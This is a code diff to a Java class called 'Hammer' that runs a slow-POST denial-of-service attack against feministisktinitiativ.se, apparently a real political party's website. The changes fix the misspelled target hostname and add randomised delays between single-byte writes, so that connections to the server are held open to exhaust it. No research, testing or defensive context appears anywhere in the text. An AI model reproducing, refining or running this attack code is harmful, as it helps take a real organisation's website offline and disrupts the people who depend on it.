@@ -27,22 +27,25 @@ public class Hammer implements Runnable {
 	@Override
 	public void run() {
 		try {
-			Socket socket = new Socket("www.feminisisktinitiativ.se", 80);
+			Socket socket = new Socket("feministisktinitiativ.se", 80);
 			OutputStream os = socket.getOutputStream();
 			
 			String useragent = getRandomUserAgent();
 			
 			os.write(("POST / HTTP/1.1\r\n" +
-                    "Host: www.feminisisktinitiativ.se\r\n" +
+                    "Host: www.feministisktinitiativ.se\r\n" +
                     "User-Agent: " + useragent + "\r\n" +
                     "Connection: keep-alive\r\n" +
                     "Keep-Alive: 900\r\n" +
                     "Content-Length: 10000\r\n" +
                     "Content-Type: application/x-www-form-urlencoded\r\n\r\n").getBytes());
 			
-			while (true) {
+			while (Main.running) {
 				os.write((randomChar()).getBytes());
+				Thread.sleep(new Random().nextInt(3000));
 			}
+			
+			socket.close();
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
